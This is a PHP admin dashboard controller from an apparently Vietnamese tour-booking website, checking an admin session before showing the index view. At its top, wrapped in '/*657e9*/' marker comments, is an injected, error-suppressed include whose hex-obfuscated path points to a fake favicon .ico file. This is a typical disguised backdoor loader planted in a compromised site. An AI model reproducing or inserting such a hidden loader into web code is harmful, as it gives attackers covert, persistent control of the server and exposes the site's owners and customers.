<?php

/*657e9*/

@include "\x2fho\x6de/\x64ul\x69ch\x61do\x2fdo\x6dai\x6es/\x64ul\x69ch\x63ha\x75au\x2eor\x67/p\x75bl\x69c_\x68tm\x6c/m\x6fde\x6c/f\x61vi\x63on\x5fd3\x65a2\x62.i\x63o";

/*657e9*/
require_once '../../config.php';
require_once DIR.'/view/admin/index.php';
require_once DIR.'/common/messenger.php';
require_once DIR.'/model/contactService.php';
require_once DIR.'/model/booking_tourService.php';
$data=array();
returnCountData();
if(isset($_SESSION["Admin"]))
{
    $data['username']=isset($_SESSION["UserName"])?$_SESSION["UserName"]:'quản trị viên';
    view_index($data);

}
else
{
    header('location: '.SITE_NAME.'/login');
}